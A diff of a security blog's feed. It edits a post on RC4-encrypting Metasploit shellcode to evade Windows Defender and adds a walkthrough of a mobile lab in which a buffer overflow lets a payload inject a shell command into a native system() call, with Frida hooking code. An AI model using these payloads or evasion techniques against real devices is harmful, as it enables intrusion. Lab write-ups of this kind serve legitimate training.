@@ -4,7 +4,7 @@ This blog post is shared purely for learning and educational purposes. I do not 
 &lt;p&gt;Alright, earlier we talked about loader and process injection techniques, but as you probably noticed, once we compiled our code, &lt;code&gt;Windows Defender&lt;/code&gt; flagged the binary as malicious and deleted. That&apos;s because we embedded &lt;code&gt;Metasploit&lt;/code&gt; shellcode directly into it. Since metasploit is a well known framework and most security tools already have signatures for its payloads.&lt;/p&gt;
 &lt;p&gt;So today, we gonna add payload encryption function to our previous code using RC4 encryption that can bypass detection and worked on window 11 as well.&lt;/p&gt;
 &lt;h3&gt;Intro to RC4 Encryption&lt;/h3&gt;
-&lt;p&gt;There any serveral ways to encrypt our payload but for this blog, I choose &lt;code&gt;RC4&lt;/code&gt; because it&apos;s fast and efficient. And &lt;code&gt;RC4&lt;/code&gt; use bidirectional encryption algorithm which mean we can use the same function for encryption and decryption. You can read more about &lt;code&gt;RC4&lt;/code&gt; encryption online but this is out of scope for now.&lt;/p&gt;
+&lt;p&gt;There are serveral ways to encrypt our payload but for this blog, I choose &lt;code&gt;RC4&lt;/code&gt; because it&apos;s fast and efficient. And &lt;code&gt;RC4&lt;/code&gt; use bidirectional encryption algorithm which mean we can use the same function for encryption and decryption. You can read more about &lt;code&gt;RC4&lt;/code&gt; encryption online but this is out of scope for now.&lt;/p&gt;
 &lt;p&gt;And there are multiple ways online to implement &lt;code&gt;RC4&lt;/code&gt; encryption in C and I took the encryption code from &lt;a href=&quot;https://wiki.vulnlab.com/lab-notes/c2-loaders/rc4-encryption&quot;&gt;xct&apos;s&lt;/a&gt; blog and made a little bit changes to use in our code.&lt;/p&gt;
 &lt;h3&gt;Encrypting Shellcode&lt;/h3&gt;
 &lt;p&gt;First, generate the shellcode using &lt;code&gt;msfvenom&lt;/code&gt; and use this python script to encrypt the payload.&lt;/p&gt;
@@ -253,6 +253,10 @@ int wmain(int argc, wchar_t* argv[])
 &lt;img src=&quot;/images/maldev/maldev9.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h3&gt;Task for you&lt;/h3&gt;
 &lt;p&gt;You can apply the same method to the shellcode loader that I covered in the &lt;a href=&quot;http://localhost:4321/posts/maldev/0x0-basic-shellcode-injection/&quot;&gt;first post&lt;/a&gt; of this series.&lt;/p&gt;
+&lt;h3&gt;Other Techniques&lt;/h3&gt;
+&lt;p&gt;There are also other payload encryption and obfuscation techniques such as &lt;code&gt;XOR&lt;/code&gt;, &lt;code&gt;AES&lt;/code&gt;, &lt;code&gt;IPv4/IPv6Fuscation&lt;/code&gt;, &lt;code&gt;MACFuscation&lt;/code&gt;, &lt;code&gt;UUIDFuscation&lt;/code&gt;, etc...&lt;/p&gt;
+&lt;p&gt;See below and try to implement these techniques in your code.&lt;/p&gt;
+&lt;p&gt;::github{repo=&quot;NUL0x4C/HellShell&quot;}&lt;/p&gt;
 &lt;h3&gt;References&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;https://wiki.vulnlab.com/lab-notes/c2-loaders/rc4-encryption&lt;/li&gt;
@@ -843,6 +847,79 @@ VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;So let&apos;s just run our code in visual studio and you can see it will pop up &lt;code&gt;calc.exe&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/images/maldev/maldev1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>MobileHacking - NoteKeeper Buffer Overflow Lab</title><link>https://k0shane.github.io/posts/android/note-keeper-lab-bof/</link><guid isPermaLink="true">https://k0shane.github.io/posts/android/note-keeper-lab-bof/</guid><pubDate>Thu, 30 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I saw someone shared this lab on linkedin and bufferoverlfow grabbed my attention. Since I really enjoy exploitation, I thought I should take a look.&lt;/p&gt;
+&lt;p&gt;This is lab description : https://www.mobilehackinglab.com/course/lab-notekeeper&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/public/images/android/notekeeper/nk1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We&apos;re given an APK file to start which is called &lt;code&gt;NoteKeeper&lt;/code&gt;. We can create a list of notes.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/public/images/android/notekeeper/nk2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;I opened the app in &lt;a href=&quot;https://github.com/skylot/jadx&quot;&gt;jadx-gui&lt;/a&gt;, but there wasn’t anything interesting in &lt;code&gt;MainActivity&lt;/code&gt;. The only thing that was a call to a native library named &lt;code&gt;notekeeper&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/public/images/android/notekeeper/nk3.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;So I quickly exported &lt;code&gt;libnotekeeper.so&lt;/code&gt; file and load it into &lt;code&gt;Ghidra&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/public/images/android/notekeeper/nk4.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;In ghidra, we can see there is a function called &lt;code&gt;Java_com_mobilehackinglab_notekeeper_MainActivity_parse&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/public/images/android/notekeeper/nk5.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;I modified some variables name to be able to read better.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;  memcpy(buffer,&quot;Log \&quot;Note added at $(date)\&quot;&quot;,500);
+  if (get_strings == (ushort *)0x0) {
+    return_value = 0;
+  }
+  else {
+    buffer_to_store_user_input[0] = FUN_00100bf4(*get_strings &amp;amp; 0xff);
+    for (i = 1; i &amp;lt; get_string_length; i = i + 1) {
+      buffer_to_store_user_input[i] = (char)get_strings[i];
+    }
+    system(buffer);
+    buffer_to_store_user_input[i] = &apos;\0&apos;;
+    return_value = _JNIEnv::NewStringUTF(local_30,buffer_to_store_user_input);
+  }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I noticed that &lt;code&gt;memcpy&lt;/code&gt; move this string &lt;code&gt;Log \&quot;Note added at $(date)\&lt;/code&gt; into &lt;code&gt;buffer&lt;/code&gt; variable and execute &lt;code&gt;$(date)&lt;/code&gt; using &lt;code&gt;system()&lt;/code&gt; library. This copies &lt;code&gt;500&lt;/code&gt; bytes from a string that&apos;s only &lt;code&gt;~28&lt;/code&gt; bytes long. So the other &lt;code&gt;472&lt;/code&gt; bytes will be junk.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;for (i = 1; i &amp;lt; get_string_length; i = i + 1) {
+    buffer_to_store_user_input[i] = (char)get_strings[i];
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And this code loop through all the characters that we typed into &lt;code&gt;title&lt;/code&gt; and appends them into &lt;code&gt;buffer_to_store_user_input&lt;/code&gt; variable which is only &lt;code&gt;100&lt;/code&gt; bytes long.&lt;/p&gt;
+&lt;p&gt;Our goal is to overwrite the &lt;code&gt;buffer&lt;/code&gt; variable with our malicious command so we can get code execution.&lt;/p&gt;
+&lt;p&gt;So what if we put data (junk) more than &lt;code&gt;100&lt;/code&gt; bytes, the extra data would overflow the &lt;code&gt;buffer&lt;/code&gt;?&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;char buffer_to_store_user_input [100];
+char buffer [500];
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;To get a better vision, I wrote a frida script to monitor system&apos;s argument from &lt;code&gt;libc&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;function HookingNative(libc, sys){
+    let addr = Module.findExportByName(libc,sys);
+    Interceptor.attach(addr, {
+      onEnter: function (argv) {
+        console.log(sys,&quot;argument -&amp;gt; &quot;, argv[0].readUtf8String())
+      }
+    })
+  }
+
+HookingNative(&quot;libc.so&quot;,&quot;system&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Run the frida script and just create a note like a normal.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/public/images/android/notekeeper/nk6.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;After that, look at frida output and &lt;code&gt;Log &quot;Note added at $(date)&quot;&lt;/code&gt; is being passed as a system&apos;s argument.&lt;/p&gt;
+&lt;p&gt;Now, to check this is overflow or not, let generate &lt;code&gt;100 A&lt;/code&gt; and add &lt;code&gt;BBBBCCCC&lt;/code&gt; at the end.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;shanekhantaun9@Mac notekeeper % python3 -c &apos;print(&quot;A&quot; * 100)&apos; 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Our payload will be like&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then run the frida script, inject our payload and see the output.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/public/images/android/notekeeper/nk7.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We can see our 4 &lt;code&gt;B&lt;/code&gt; and &lt;code&gt;C&lt;/code&gt; are overwriting the value of &lt;code&gt;buffer&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Now let inject linux &lt;code&gt;id&lt;/code&gt; command after hunderd &lt;code&gt;A&lt;/code&gt;. The payload will be like below&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAid &amp;gt; /data/data/com.mobilehackinglab.notekeeper/hacked.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Copy that payload, paste it into note.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/public/images/android/notekeeper/nk8.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We&apos;ve completely inject our command into &lt;code&gt;buffer&lt;/code&gt; field.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/public/images/android/notekeeper/nk9.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;After checking the file under &lt;code&gt;/data/data/com.mobilehackinglab.notekeeper&lt;/code&gt; directory.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/public/images/android/notekeeper/nk10.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;We can see that it successfully created a &lt;code&gt;hacked.txt&lt;/code&gt; file &lt;code&gt;id&lt;/code&gt; command.&lt;/p&gt;
+&lt;p&gt;That&apos;s it, you can also write frida script to inject the payload.&lt;/p&gt;
 </content:encoded></item><item><title>SSRF to S3 Bucket Compromised</title><link>https://k0shane.github.io/posts/cloud-security/ssrf-to-s3-bucket-compromised/</link><guid isPermaLink="true">https://k0shane.github.io/posts/cloud-security/ssrf-to-s3-bucket-compromised/</guid><pubDate>Wed, 29 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;Description&lt;/h3&gt;
 &lt;p&gt;This challenge from &lt;a href=&quot;https://pwnedlabs.io/labs/ssrf-to-pwned&quot;&gt;pwnedlab&lt;/a&gt; is easy and beginner friendly called SSRF to Pwned.&lt;/p&gt;
 &lt;p&gt;The starting point is a single url : http://app.huge-logistics.com&lt;/p&gt;
